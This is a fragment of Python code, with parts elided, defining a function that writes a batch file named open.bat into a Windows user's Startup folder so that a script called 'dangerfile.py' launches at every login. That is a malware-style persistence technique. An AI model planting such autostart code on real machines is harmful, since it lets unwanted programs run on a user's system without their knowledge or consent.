...
def add_to_startup(file_path=""):
    ...
    bat_path = r'C:\Users\$6P9000-8UJJA5TAH4AR\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s\dangerfile.py"' % file_path)
